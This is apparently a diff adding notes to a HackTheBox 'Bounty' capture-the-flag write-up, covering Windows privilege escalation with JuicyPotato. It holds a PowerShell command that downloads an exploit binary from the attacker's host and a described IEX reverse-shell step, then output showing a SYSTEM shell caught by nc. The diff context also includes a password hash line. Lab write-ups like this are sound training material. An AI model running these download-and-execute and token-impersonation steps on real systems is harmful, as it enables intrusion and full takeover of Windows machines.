@@ -294,4 +294,64 @@ merlin:1000:aad3b435b51404eeaad3b435b51404ee:2d588983dbc4d1356b19277afef85092:::
 ```
 
 ## Notes
-After completing this machine I went looking for a way to do it without using metasploit. On payloadsallthethings I found a token handling exploit called JuicyPotato:
+After completing this machine I went looking for a way to do it without using Metasploit. On payloadsallthethings I found a token handling exploit called JuicyPotato: https://github.com/ohpe/juicy-potato which is able to capture and apply impersonation tokens.
+Download the binary and give it a test-run:
+```shell
+powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.162:8080/jp.exe','C:\Windows\Temp\jp.exe')"
+
+dir
+
+
+    Directory: C:\Windows\Temp
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----         6/10/2018   3:44 PM            vmware-SYSTEM                     
+-a---         5/30/2018   3:19 AM          0 DMI5FAC.tmp                       
+-a---        12/20/2020   3:58 PM     347648 jp.exe                            
+-a---        12/20/2020   3:37 PM      73802 nUdkXekZwZO.exe                   
+-a---        12/20/2020   3:22 PM     207872 rev2.exe                          
+-a---         6/10/2018   3:44 PM     203777 vminst.log                        
+-a---        12/20/2020   1:31 PM      59269 vmware-vmsvc.log                  
+-a---         6/11/2018  12:47 AM      22447 vmware-vmusr.log                  
+-a---        12/20/2020   1:31 PM       1001 vmware-vmvss.log                  
+
+
+
+.\jp.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
+-p <program>: program to launch
+-l <port>: COM server listen port
+
+
+Optional args: 
+-m <ip>: COM server listen address (default 127.0.0.1)
+-a <argument>: command line argument to pass to program (default NULL)
+-k <ip>: RPC server ip address (default 127.0.0.1)
+-n <port>: RPC server listen port (default 135)
+-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+-z only test CLSID and print token's user
+```
+I create a simple batch file, the reason being I need something that can execute inside cmd. In it, I just put my powershell IEX command which will download my reverse shell script and connect back to my machine's port 9998. Then I call the exe, letting it try both createprocess calls, and a COM port.
+```shell
+jp.exe -t * -p shellme.bat -l 3133
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 3133
+....
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+```
+Check nc:
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-hlstiq4d2b]─[~/writeups/HackTheBox/HTB_Bounty]
+└──╼ [★]$ nc -lnvp 9998
+listening on [any] 9998 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.65.179] 49205
+whoami
+nt authority\system
+```
